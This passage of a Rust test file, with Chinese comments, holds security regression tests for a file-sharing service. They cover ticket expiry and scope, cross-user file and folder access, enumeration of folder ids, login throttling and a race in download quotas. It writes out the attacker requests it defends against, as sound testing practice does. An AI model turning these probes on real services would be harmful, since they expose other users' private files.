// 查询串。原先走的是 **JWT 本身** —— 7 天有效期的全权限凭据被写进每一次
// 缩略图 URL，而查询串会被 Cloudflare 边缘日志、浏览器历史完整记录。
// 现在换成窄口径、2 小时有效的 media ticket。
//
// 下面这几条锁的是换过之后必须同时成立的四件事：有效期仍要拦、正常用户仍要
// 能用、JWT 不再能从查询串进来、票据不反向升格成 bearer token。

/// 已过期账号的媒体票据，走查询参数旁路仍必须被拒。
///
/// 旁路存在的理由是 `<img src>` 与下载链接无法带 Authorization 头。
/// 但「验签通过」只说明票据是我们签的、没过 2 小时，说明不了签发者现在还有权限。
#[tokio::test]
async fn media_ticket_cannot_bypass_account_expiry() {
    let f = fixture("sec_ticket_expiry").await;
    let (uid, _token) = add_user(&f, "expired_user").await;
    let (file_id, _) = add_file(&f, uid, "secret.jpg", b"private").await;
    let ticket = crypto::create_media_ticket(&f.config, uid, 3600);

    // 票据此刻仍然有效（未过期、未篡改）
    let before = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/files/{}/download", file_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(before.status(), StatusCode::UNAUTHORIZED, "无凭据应被拒");

    // 账号过期后，同一枚票据从旁路也应失效
    expire_user(&f, uid).await;
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/files/{}/download?ticket={}", file_id, ticket))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::UNAUTHORIZED,
        "已过期账号的票据不得继续下载"
    );

    // 媒体接口同理（缩略图 URL 同样走这条旁路）
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/files/{}/media?ticket={}", file_id, ticket))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::UNAUTHORIZED,
        "已过期账号的票据不得继续读取媒体"
    );

    f.cleanup().await;
}

/// 未过期账号不受影响 —— 防止修复过头把正常用户也挡在门外。
#[tokio::test]
async fn media_ticket_works_for_active_account() {
    let f = fixture("sec_ticket_ok").await;
    let (uid, _token) = add_user(&f, "active_user").await;
    let (file_id, _) = add_file(&f, uid, "ok.jpg", b"hello").await;
    let ticket = crypto::create_media_ticket(&f.config, uid, 3600);

    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/files/{}/download?ticket={}", file_id, ticket))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK, "有效账号必须仍能走旁路下载");

    f.cleanup().await;
}

/// **JWT 不再能从查询串进来。**
///
/// 这是整个替换的意义所在：只要旧入口还留着，泄漏路径就没有真正关掉 ——
/// 前端改了，书签、历史记录里那些 `?token=<7天JWT>` 的旧 URL 照样有效。
#[tokio::test]
async fn jwt_is_not_accepted_in_the_query_string() {
    let f = fixture("sec_no_jwt_in_query").await;
    let (uid, token) = add_user(&f, "jwt_user").await;
    let (file_id, _) = add_file(&f, uid, "ok.jpg", b"hello").await;

    for uri in [
        format!("/api/files/{}/download?token={}", file_id, token),
        format!("/api/files/{}/media?token={}", file_id, token),
    ] {
        let res = router(&f)
            .oneshot(Request::builder().uri(&uri).body(Body::empty()).unwrap())
            .await
            .unwrap();
        assert_eq!(
            res.status(),
            StatusCode::UNAUTHORIZED,
            "JWT 不应再被查询串接受（{uri}）—— 否则旧 URL 会一直有效"
        );
    }

    f.cleanup().await;
}

/// 媒体票据不能反过来当 bearer token 用：它只对媒体/下载接口有效。
#[tokio::test]
async fn media_ticket_cannot_be_used_as_a_bearer_token() {
    let f = fixture("sec_ticket_scope").await;
    let (uid, _token) = add_user(&f, "scope_user").await;
    let ticket = crypto::create_media_ticket(&f.config, uid, 3600);

    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri("/api/files")
                .header(header::AUTHORIZATION, format!("Bearer {}", ticket))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::UNAUTHORIZED,
        "媒体票据拿去当 JWT 用必须失败 —— 它的价值就在于口径窄"
    );

    f.cleanup().await;
}

/// 票据只对签发给它的那个用户有效，换别人用必须失败。
#[tokio::test]
async fn media_ticket_is_bound_to_its_owner() {
    let f = fixture("sec_ticket_owner").await;
    let (alice, _) = add_user(&f, "alice_t").await;
    let (bob, _) = add_user(&f, "bob_t").await;
    let (bob_file, _) = add_file(&f, bob, "bob.jpg", b"bob's").await;

    // 用 alice 的票据去读 bob 的文件：票据身份成立，但归属校验必须拦住
    let alice_ticket = crypto::create_media_ticket(&f.config, alice, 3600);
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!(
                    "/api/files/{}/download?ticket={}",
                    bob_file, alice_ticket
                ))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::NOT_FOUND,
        "票据只回答「你是谁」，能看哪份文件仍由 owner_id 把关"
    );

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 缺陷 6：AdminUser 不校验账号有效期
// ---------------------------------------------------------------------------

#[tokio::test]
async fn expired_admin_cannot_use_admin_endpoints() {
    let f = fixture("sec_admin_expiry").await;
    let (uid, token) = add_user(&f, "boss").await;
    sqlx::query("UPDATE users SET role = 'admin' WHERE id = ?")
        .bind(uid)
        .execute(&f.pool)
        .await
        .unwrap();
    expire_user(&f, uid).await;

    let res = router(&f)
        .oneshot(authed_get("/api/admin/users", &token))
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::UNAUTHORIZED,
        "已过期管理员不得管理用户"
    );

    f.cleanup().await;
}

#[tokio::test]
async fn active_admin_still_works() {
    let f = fixture("sec_admin_ok").await;
    let (uid, token) = add_user(&f, "boss").await;
    sqlx::query("UPDATE users SET role = 'admin' WHERE id = ?")
        .bind(uid)
        .execute(&f.pool)
        .await
        .unwrap();

    let res = router(&f)
        .oneshot(authed_get("/api/admin/users", &token))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK, "有效管理员必须仍能管理用户");

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 缺陷 2/3：batch_unshare 泄露他人文件名 + 无数量上限
// ---------------------------------------------------------------------------

#[tokio::test]
async fn batch_unshare_does_not_leak_other_users_filenames() {
    let f = fixture("sec_unshare_leak").await;
    let (victim_id, _) = add_user(&f, "victim").await;
    let (_attacker_id, attacker_token) = add_user(&f, "attacker").await;
    let (victim_file, _) = add_file(&f, victim_id, "客户张三_私密写真.heic", b"x").await;

    // 攻击者对自己没有分享的文件发起批量取消分享
    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/batch/unshare",
            &attacker_token,
            &format!(r#"{{"items":[{{"type":"file","id":{}}}]}}"#, victim_file),
        ))
        .await
        .unwrap();
    let body = json_body(res).await;
    let raw = serde_json::to_string(&body).unwrap();

    assert!(
        !raw.contains("私密写真") && !raw.contains("客户张三"),
        "响应里绝不能出现他人文件名，实际: {raw}"
    );
    let name = body["data"]["results"][0]["name"]
        .as_str()
        .unwrap_or_default();
    assert_eq!(name, "(未知)", "非本人的文件应显示占位符");

    f.cleanup().await;
}

#[tokio::test]
async fn batch_unshare_rejects_oversized_request() {
    let f = fixture("sec_unshare_cap").await;
    let (_, token) = add_user(&f, "bulk").await;

    let ids: Vec<String> = (1..=(crate::services::batch_service::MAX_BATCH_SIZE + 1))
        .map(|i| i.to_string())
        .collect();
    let payload = format!(
        r#"{{"items":[{}]}}"#,
        ids.iter()
            .map(|i| format!(r#"{{"type":"file","id":{}}}"#, i))
            .collect::<Vec<_>>()
            .join(",")
    );

    let res = router(&f)
        .oneshot(authed_json("POST", "/api/batch/unshare", &token, &payload))
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::BAD_REQUEST,
        "超过 MAX_BATCH_SIZE 的批量请求应被拒"
    );

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 缺陷 4：软删除不撤销分享
// ---------------------------------------------------------------------------

#[tokio::test]
async fn soft_deleting_a_file_revokes_its_share() {
    let f = fixture("sec_share_revoke").await;
    let (uid, token) = add_user(&f, "owner").await;
    let (file_id, _) = add_file(&f, uid, "deliver.jpg", b"bytes").await;

    // 建立一个无密码、无期限的分享
    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &format!(r#"{{"items":[{{"type":"file","id":{}}}],"expires_hours":null,"password":null,"max_downloads":null,"custom_code":null}}"#, file_id),
        ))
        .await
        .unwrap();
    let body = json_body(res).await;
    let share_id = body["data"]["id"].as_str().expect("应返回分享 id").to_string();

    // 删除前可下载
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}/download?file_id={}", share_id, file_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK, "删除前分享应可用");

    // 软删除文件
    sqlx::query("UPDATE files SET deleted_at = datetime('now') WHERE id = ?")
        .bind(file_id)
        .execute(&f.pool)
        .await
        .unwrap();

    // 删除后必须失效
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}/download?file_id={}", share_id, file_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::NOT_FOUND,
        "文件进回收站后分享链接必须失效 —— 否则就是「我删了但客户还能下载」"
    );

    // 分享详情（无需任何凭证即可访问的元数据）也不得再暴露文件名
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}", share_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let body = json_body(res).await;
    let raw = serde_json::to_string(&body).unwrap();
    assert!(
        !raw.contains("deliver.jpg"),
        "软删除后分享详情不得再暴露文件名，实际: {raw}"
    );

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 缺陷 5：上传 folder_id 无归属校验
// ---------------------------------------------------------------------------

#[tokio::test]
async fn upload_cannot_write_into_another_users_folder() {
    let f = fixture("sec_folder_owner").await;
    let (victim_id, _) = add_user(&f, "folder_owner").await;
    let (_, attacker_token) = add_user(&f, "intruder").await;

    let (victim_folder,): (i64,) = sqlx::query_as(
        "INSERT INTO folders (name, owner_id, parent_id) VALUES ('客户资料', ?, NULL) RETURNING id",
    )
    .bind(victim_id)
    .fetch_one(&f.pool)
    .await
    .unwrap();

    // 攻击者把 folder_id 指向受害者的文件夹
    let body = multipart_with_folder(&format!("{}", victim_folder), "intrude.jpg", b"malicious");
    let res = router(&f)
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/files/upload")
                .header(header::AUTHORIZATION, format!("Bearer {}", attacker_token))
                .header(header::CONTENT_TYPE, "multipart/form-data; boundary=X-BOUNDARY")
                .body(Body::from(body))
                .unwrap(),
        )
        .await
        .unwrap();

    assert!(
        res.status() == StatusCode::BAD_REQUEST || res.status() == StatusCode::FORBIDDEN,
        "上传到他人文件夹必须被拒，实际状态 {:?}",
        res.status()
    );

    // 确认没有文件被写进去
    let (n,): (i64,) = sqlx::query_as(
        "SELECT COUNT(*) FROM files WHERE folder_id = ? AND original_name = 'intrude.jpg'",
    )
    .bind(victim_folder)
    .fetch_one(&f.pool)
    .await
    .unwrap();
    assert_eq!(n, 0, "受害者文件夹里不应出现任何文件");

    f.cleanup().await;
}

/// 构造一个带 `folder_id` 字段的 multipart 请求体。
///
/// 与上面的 `multipart_body` 分开：那个只带 `file` 字段（P0 的 XSS 测试用），
/// 这里需要额外携带 folder_id 才能验证「上传到他人文件夹」被拒。
fn multipart_with_folder(folder_id: &str, filename: &str, content: &[u8]) -> Vec<u8> {
    let mut b: Vec<u8> = Vec::new();
    b.extend_from_slice(b"--X-BOUNDARY\r\n");
    b.extend_from_slice(b"Content-Disposition: form-data; name=\"folder_id\"\r\n\r\n");
    b.extend_from_slice(folder_id.as_bytes());
    b.extend_from_slice(b"\r\n--X-BOUNDARY\r\n");
    b.extend_from_slice(
        format!(
            "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n",
            filename
        )
        .as_bytes(),
    );
    b.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
    b.extend_from_slice(content);
    b.extend_from_slice(b"\r\n--X-BOUNDARY--\r\n");
    b
}

// ---------------------------------------------------------------------------
// 缺陷 7：登录无速率限制
// ---------------------------------------------------------------------------

#[tokio::test]
async fn login_is_throttled_after_repeated_failures() {
    let f = fixture("sec_login_throttle").await;
    add_user(&f, "victim_acct").await;

    let attempt = |password: &'static str| {
        let f = &f;
        async move {
            router(f)
                .oneshot(
                    Request::builder()
                        .method("POST")
                        .uri("/api/auth/login")
                        .header(header::CONTENT_TYPE, "application/json")
                        .body(Body::from(format!(
                            r#"{{"username":"victim_acct","password":"{}"}}"#,
                            password
                        )))
                        .unwrap(),
                )
                .await
                .unwrap()
                .status()
        }
    };

    // ① 先真打几次错误密码，确认「失败会被记进限流器」这条链路是通的。
    //    刻意只打 3 次（< 阈值 5）：这一段的目的是验证记账，不是验证退避。
    for _ in 0..3 {
        assert_eq!(attempt("wrong").await, StatusCode::UNAUTHORIZED);
    }

    // ② 直接把计数推过阈值，再发**一次**请求断言被拒。
    //
    //    为什么不在这里继续打满 5 次然后断言 429：那要求这几次请求全部落在
    //    退避窗口内，而窗口是从「最后一次失败」起算的固定 5 秒（BASE_BACKOFF）。
    //    并行跑整个测试套件时，每次登录都要等 bcrypt（现在走 4 个许可的信号量，
    //    会和其它用例排队），单次可能耗时数秒 —— 窗口在断言之前就过期了，
    //    于是测试随机失败。实测：并行下约 1/4 的运行会挂，单独跑则 100% 通过。
    //
    //    推过阈值之后只发一次请求，它必然落在窗口内，断言因此是确定的。
    //    被验证的产品行为没有变：入口在**查库与 bcrypt 之前**先问限流器，
    //    命中退避就返回 429。
    for _ in 0..crate::utils::login_throttle::THRESHOLD {
        crate::utils::login_throttle::record_failure("victim_acct", "");
    }

    assert_eq!(
        attempt("wrong").await,
        StatusCode::TOO_MANY_REQUESTS,
        "退避期内必须返回 429，否则公网上可无限试"
    );

    // ③ 退避期内**正确密码**同样进不来 —— 这是限流真正要挡住的东西：
    //    若只在密码错时才拦，攻击者猜中那一次就直接绕过了退避。
    assert_eq!(
        attempt("secret123").await,
        StatusCode::TOO_MANY_REQUESTS,
        "退避期内正确密码也不该放行"
    );

    f.cleanup().await;
}

#[tokio::test]
async fn normal_login_is_not_throttled() {
    let f = fixture("sec_login_ok").await;
    add_user(&f, "good_acct").await;

    // 换几个账号各自失败几次，不该互相牵连
    for name in ["a", "b", "c", "d", "e", "f", "g", "h"] {
        let _ = router(&f)
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/api/auth/login")
                    .header(header::CONTENT_TYPE, "application/json")
                    .body(Body::from(format!(
                        r#"{{"username":"{}","password":"wrong"}}"#,
                        name
                    )))
                    .unwrap(),
            )
            .await
            .unwrap();
    }

    // 另一个账号仍能正常登录
    let res = router(&f)
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/auth/login")
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(r#"{"username":"good_acct","password":"secret123"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK, "他人失败不得影响该账号登录");

    // 这里**不**调 `login_throttle::reset_for_test()`：它清的是进程级全局表，
    // 而 `login_throttle` 自己的测试正并行观察着同一张表，一清就会让它们随机
    // 失败。本用例用的都是独有用户名（good_acct / a..h），本来也不会与别人串味。
    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 缺陷 9：下载计数先自增后传输，并发可超发
// ---------------------------------------------------------------------------

/// 并发下载不得突破 max_downloads —— 这才是「检查与自增分属两个事务」的真正后果。
///
/// 串行发两次请求看不出问题：validate_share 的次数检查会挡住第二次。
/// 但并发时 N 个请求会**同时**读到「还有额度」，各自判定通过，然后全部自增，
/// 限额分享实际发出 max + (N-1) 份。修复前这条测试会看到 download_count
/// 远超 max_downloads。
#[tokio::test]
async fn concurrent_downloads_cannot_exceed_max_downloads() {
    let f = fixture("sec_dl_concurrent").await;
    let (uid, token) = add_user(&f, "concurrent").await;
    let (file_id, _) = add_file(&f, uid, "hot.jpg", b"payload").await;

    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &format!(r#"{{"items":[{{"type":"file","id":{}}}],"expires_hours":null,"password":null,"max_downloads":3,"custom_code":null}}"#, file_id),
        ))
        .await
        .unwrap();
    let body = json_body(res).await;
    let share_id = body["data"]["id"].as_str().unwrap().to_string();

    // 8 个请求同时打一个只允许 3 次下载的分享
    let r = router(&f);
    let reqs: Vec<_> = (0..8)
        .map(|_| {
            Request::builder()
                .uri(format!("/api/public/shares/{}/download?file_id={}", share_id, file_id))
                .body(Body::empty())
                .unwrap()
        })
        .collect();
    let results = futures_util::future::join_all(reqs.into_iter().map(|req| r.clone().oneshot(req)))
        .await;

    let ok_count = results
        .iter()
        .filter_map(|r| r.as_ref().ok())
        .filter(|res| res.status() == StatusCode::OK)
        .count();

    // 计数不得超过额度
    let (count,): (i64,) = sqlx::query_as("SELECT download_count FROM file_shares WHERE id = ?")
        .bind(&share_id)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(
        count, 3,
        "download_count 必须恰好等于额度 3，实际 {count}（成功响应 {ok_count} 个）—— 超过说明检查与自增不是原子的"
    );
    assert_eq!(
        ok_count, 3,
        "成功响应数必须等于额度 3，实际 {ok_count}"
    );

    f.cleanup().await;
}

#[tokio::test]
async fn download_slot_is_not_consumed_when_quota_exhausted() {
    let f = fixture("sec_download_slot").await;
    let (uid, token) = add_user(&f, "quota").await;
    let (file_id, _) = add_file(&f, uid, "once.jpg", b"x").await;

    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &format!(r#"{{"items":[{{"type":"file","id":{}}}],"expires_hours":null,"password":null,"max_downloads":1,"custom_code":null}}"#, file_id),
        ))
        .await
        .unwrap();
    let body = json_body(res).await;
    let share_id = body["data"]["id"].as_str().unwrap().to_string();

    // 第一次：成功
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}/download?file_id={}", share_id, file_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);

    // 第二次：额度已尽
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}/download?file_id={}", share_id, file_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::GONE, "超过 max_downloads 应被拒");

    // 关键：额度用尽的那次请求不应再把计数推高
    let (count,): (i64,) = sqlx::query_as("SELECT download_count FROM file_shares WHERE id = ?")
        .bind(&share_id)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(count, 1, "被拒的请求不得消耗额度，实际计数 {count}");

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 缺陷 8：上传中途失败不得报成功
// ---------------------------------------------------------------------------

/// 分块传输（无 Content-Length）时请求体超限，服务端必须报错而不是「成功上传了一部分」。
///
/// **这里必须不带 Content-Length。** 修复前 `while let Ok(Some(field))` 把
/// body limit 触发的 Err 当作流正常结束，已落盘的 .part 仍会被提交、响应 success:true。
///
/// 而带 Content-Length 的超限请求走的是另一条路：`files.rs` 在进入循环**之前**
/// 就有一道粗预检直接返回 413。最初这个测试写的是带 Content-Length 的版本，
/// 结果**回退修复后依然通过** —— 它压根没进循环，测的是预检而不是吞错逻辑。
/// 真实场景（浏览器上传大文件、chunked 编码）恰恰没有 Content-Length。
#[tokio::test]
async fn truncated_upload_does_not_report_success() {
    let f = fixture("sec_upload_truncated").await;
    let (_, token) = add_user(&f, "uploader").await;

    // 构造一个超过 max_file_size（夹具里是 1MB）的 multipart 请求体，
    // 且**不声明 Content-Length** —— 逼服务端只能靠流式读取发现超限，
    // 于是错误会落在 multipart.next_field() 的 Err 上，这正是被修的那条路径。
    let big = vec![b'A'; 2 * 1024 * 1024];
    let body = multipart_with_folder("0", "big.jpg", &big);
    let req = Request::builder()
        .method("POST")
        .uri("/api/files/upload")
        .header(header::AUTHORIZATION, format!("Bearer {}", token))
        .header(header::CONTENT_TYPE, "multipart/form-data; boundary=X-BOUNDARY")
        .body(Body::from(body))
        .unwrap();

    let res = router(&f).oneshot(req).await.unwrap();
    let status = res.status();
    let body = json_body(res).await;

    assert!(
        !status.is_success(),
        "超限上传必须报错，实际返回 {status}"
    );
    assert_eq!(body["success"], serde_json::json!(false));

    // 也不能有任何文件被提交
    let (n,): (i64,) = sqlx::query_as("SELECT COUNT(*) FROM files WHERE original_name = 'big.jpg'")
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(n, 0, "失败的上传不得留下文件记录");

    f.cleanup().await;
}

// ===========================================================================
// 回归测试：公网暴露前三项修复
// ---------------------------------------------------------------------------
// 下面每一组都对应一个**实测坐实过**的缺陷，断言写成行为式
// （「B 不能通过 A 这条路拿到 X」）而非快照式，重构不会误报。
// ===========================================================================

/// 造一个属于 `owner` 的文件夹，返回 folder_id。
async fn add_folder(f: &Fixture, owner: i64, name: &str, parent: Option<i64>) -> i64 {
    let (id,): (i64,) = sqlx::query_as(
        "INSERT INTO folders (name, owner_id, parent_id) VALUES (?, ?, ?) RETURNING id",
    )
    .bind(name)
    .bind(owner)
    .bind(parent)
    .fetch_one(&f.pool)
    .await
    .expect("插入文件夹失败");
    id
}

// ---- 修复 1：面包屑跨用户泄露 ----

/// 他人的文件夹树不得出现在任何用户的面包屑里。
///
/// 修复前 `get_breadcrumbs` 只按 id 查、不带 owner_id，任意登录用户构造
/// `parent_id=<他人文件夹ID>` 就能读到对方整条祖先链（文件夹名在交付场景里
/// 常含客户姓名），而 folders.id 是稠密自增整数，遍历成本几乎为零。
#[tokio::test]
async fn breadcrumbs_never_leak_another_users_folders() {
    let f = fixture("breadcrumb_owner").await;
    let (_victim_id, _victim_token) = add_user(&f, "victim").await;
    let (_attacker_id, attacker_token) = add_user(&f, "attacker").await;

    // 受害者的两级文件夹树
    let root = add_folder(&f, 1, "客户张三_私密写真", None).await;
    let child = add_folder(&f, 1, "精修成片", Some(root)).await;

    // 攻击者持自己的合法令牌，构造 parent_id 指向他人文件夹
    for target in [root, child] {
        let res = router(&f)
            .oneshot(authed_get(
                &format!("/api/folders?parent_id={}", target),
                &attacker_token,
            ))
            .await
            .unwrap();
        let status = res.status();
        let body = json_body(res).await;

        assert_eq!(status, StatusCode::OK, "列表本身应正常返回");
        assert_eq!(
            body["data"]["folders"],
            serde_json::json!([]),
            "他人文件夹不得出现在列表里"
        );
        let crumbs = body["data"]["breadcrumbs"]
            .as_array()
            .expect("breadcrumbs 应是数组");
        assert!(
            crumbs.is_empty(),
            "面包屑泄露了他人文件夹：{}",
            serde_json::to_string(crumbs).unwrap()
        );
    }

    // 边界：遍历稠密 id 也不该捞到任何他人文件夹
    for id in 1..6 {
        let res = router(&f)
            .oneshot(authed_get(
                &format!("/api/folders?parent_id={}", id),
                &attacker_token,
            ))
            .await
            .unwrap();
        let body = json_body(res).await;
        let crumbs = body["data"]["breadcrumbs"].as_array().expect("应是数组");
        assert!(crumbs.is_empty(), "枚举 parent_id={id} 捞到了他人文件夹");
    }

    f.cleanup().await;
}

/// 自己的文件夹面包屑必须照常工作——修越权最容易出的错是把正常功能也挡住。
#[tokio::test]
async fn owner_still_sees_own_breadcrumbs() {
    let f = fixture("breadcrumb_ok").await;
    let (_, token) = add_user(&f, "alice").await;

    let root = add_folder(&f, 1, "2026 春季", None).await;
    let child = add_folder(&f, 1, "外景", Some(root)).await;

    let res = router(&f)
        .oneshot(authed_get(
            &format!("/api/folders?parent_id={}", child),
            &token,
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let body = json_body(res).await;

    let crumbs = body["data"]["breadcrumbs"].as_array().expect("应是数组");
    assert_eq!(crumbs.len(), 2, "应返回从根到当前的完整祖先链");
    assert_eq!(crumbs[0]["name"], serde_json::json!("2026 春季"));
    assert_eq!(crumbs[1]["name"], serde_json::json!("外景"));

    f.cleanup().await;
}

// ---- 修复 2：注册改为邀请制 ----

/// 没有邀请码不得注册。这是公网 DoS 的根本防线：新用户默认 5GB 配额，
/// 公开注册等于允许任何人无限创建账号吃满磁盘。
#[tokio::test]
async fn register_without_invite_code_is_rejected() {
    let f = fixture("invite_required").await;

    for payload in [
        r#"{"username":"nope1","password":"secret123"}"#,
        r#"{"username":"nope2","password":"secret123","invite_code":""}"#,
        r#"{"username":"nope3","password":"secret123","invite_code":"   "}"#,
    ] {
        let req = Request::builder()
            .method("POST")
            .uri("/api/auth/register")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(payload))
            .unwrap();
        let res = router(&f).oneshot(req).await.unwrap();
        let status = res.status();
        let body = json_body(res).await;

        assert!(
            status == StatusCode::BAD_REQUEST,
            "无邀请码的注册必须被拒，实际 {status}，body={body}"
        );
        assert_eq!(body["success"], serde_json::json!(false));
    }

    let (n,): (i64,) = sqlx::query_as("SELECT COUNT(*) FROM users")
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(n, 0, "被拒的注册不得留下账号");

    f.cleanup().await;
}

/// 无效邀请码不得注册，且**不消耗任何码**。
#[tokio::test]
async fn register_with_bogus_invite_code_is_rejected() {
    let f = fixture("invite_bogus").await;
    let (admin_id, _) = add_user(&f, "admin").await;

    let real = crate::services::invite_code_service::create_codes(&f.pool, admin_id, 1, 1, None, "")
        .await
        .unwrap()
        .remove(0);

    let req = Request::builder()
        .method("POST")
        .uri("/api/auth/register")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(
            r#"{"username":"mallory","password":"secret123","invite_code":"NOSUCHCODE"}"#,
        ))
        .unwrap();
    let res = router(&f).oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::BAD_REQUEST);

    // 关键：一次失败不能让管理员的有效码凭空少一次配额
    let (used,): (i64,) = sqlx::query_as("SELECT used_count FROM invite_codes WHERE id = ?")
        .bind(real.id)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(used, 0, "被拒的注册消耗了真实邀请码的配额");

    f.cleanup().await;
}

/// 完整链路：管理员发码 → 验码不消费 → 客户注册成功 → 码立即失效 → 二次使用被拒。
#[tokio::test]
async fn invite_code_registers_once_then_is_dead() {
    let f = fixture("invite_flow").await;
    // 邀请码接口受 AdminUser 保护，夹具必须造一个 role='admin' 的用户。
    // （add_user 插的是普通用户，这里显式提权——走的是和线上不同的路径，
    //   正好也验证了「只有管理员能用邀请码接口」。）
    let (admin_id, admin_token) = add_user(&f, "boss").await;
    sqlx::query("UPDATE users SET role = 'admin' WHERE id = ?")
        .bind(admin_id)
        .execute(&f.pool)
        .await
        .unwrap();

    // 管理员通过 HTTP 接口发码
    let req = authed_json(
        "POST",
        "/api/admin/invite-codes",
        &admin_token,
        r#"{"count":1,"max_uses":1,"note":"张三 婚礼"}"#,
    );
    let res = router(&f).oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK, "发码应成功");
    let body = json_body(res).await;
    let code_id = body["data"]["codes"][0]["id"].as_i64().expect("应有 id");
    let code = body["data"]["codes"][0]["code"]
        .as_str()
        .expect("应返回邀请码")
        .to_string();
    assert_eq!(code.len(), 10, "邀请码长度固定，便于口述");

    // 验码接口不消费
    let req = Request::builder()
        .method("POST")
        .uri("/api/auth/invite/verify")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(format!(r#"{{"invite_code":"{}"}}"#, code)))
        .unwrap();
    let res = router(&f).oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK, "验码应通过");
    let (used,): (i64,) = sqlx::query_as("SELECT used_count FROM invite_codes WHERE id = ?")
        .bind(code_id)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(used, 0, "验码不得消费邀请码");

    // 客户注册
    let req = Request::builder()
        .method("POST")
        .uri("/api/auth/register")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(format!(
            r#"{{"username":"client_zhang","password":"secret123","invite_code":"{}"}}"#,
            code
        )))
        .unwrap();
    let res = router(&f).oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK, "凭码注册应成功");
    let reg = json_body(res).await;
    assert_eq!(reg["success"], serde_json::json!(true));
    // 注册出来的必须是普通用户，不能借注册路径提权
    assert_eq!(reg["data"]["user"]["role"], serde_json::json!("user"));

    // 码已被消费并记录了使用者
    let (used, used_by): (i64, Option<i64>) =
        sqlx::query_as("SELECT used_count, used_by FROM invite_codes WHERE code = ?")
            .bind(&code)
            .fetch_one(&f.pool)
            .await
            .unwrap();
    assert_eq!(used, 1, "码应被计为已使用");
    assert!(used_by.is_some(), "应记录是谁用了这个码");

    // 同一个码不能再注册第二个人
    let req = Request::builder()
        .method("POST")
        .uri("/api/auth/register")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(format!(
            r#"{{"username":"someone_else","password":"secret123","invite_code":"{}"}}"#,
            code
        )))
        .unwrap();
    let res = router(&f).oneshot(req).await.unwrap();
    assert_eq!(
        res.status(),
        StatusCode::BAD_REQUEST,
        "用过的码不得再注册"
    );

    let (n,): (i64,) = sqlx::query_as("SELECT COUNT(*) FROM users WHERE username = 'someone_else'")
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(n, 0, "被拒的注册不得留下账号");

    f.cleanup().await;
}

/// 注册失败（用户名已存在）必须回滚码的占用——否则客户改个用户名重试，
/// 码就被白白消耗掉了。
#[tokio::test]
async fn failed_registration_does_not_consume_the_invite_code() {
